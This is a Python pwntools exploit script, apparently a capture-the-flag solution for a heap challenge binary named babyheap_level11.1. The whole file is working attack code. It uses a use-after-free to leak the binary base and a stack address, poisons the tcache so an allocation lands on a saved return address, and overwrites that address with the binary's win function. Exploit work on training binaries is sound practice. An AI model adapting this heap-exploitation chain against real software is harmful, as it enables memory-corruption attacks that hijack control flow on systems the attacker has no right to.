from pwn import *

BINARY = "/challenge/babyheap_level11.1"
p = process(BINARY)
binary = ELF(BINARY)

# setup for leak
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'100')
p.sendline(b'free')
p.sendline(b'0')

# leak binary addr
p.sendline(b'echo')
p.sendline(b'0')
p.sendline(b'112')
p.recvuntil(b'Data: ')
bin_echo = p.recvuntil(b'\n')[:-1]
binary_base = unpack(bin_echo, 'all') - binary.sym['bin_echo']
binary.address = binary_base
print(p64(binary.address))

# leak stack addr
p.sendline(b'echo')
p.sendline(b'0')
p.sendline(b'120')
p.recvuntil(b'Data: ')
stack_leak = p.recvuntil(b'\n')[:-1]
ret_addr = unpack(stack_leak, 'all') + 374
print(p64(ret_addr))

p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'200')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'200')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'free')
p.sendline(b'1')
p.sendline(b'scanf')
p.sendline(b'1')
p.recv()
p.sendline(p64(ret_addr))
p.sendline(b'malloc')
p.sendline(b'2')
p.sendline(b'200')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'200')
p.sendline(b'scanf')
p.sendline(b'1')
p.sendline(p64(binary.sym.win))
p.recv()
p.sendline(b'quit')

p.interactive()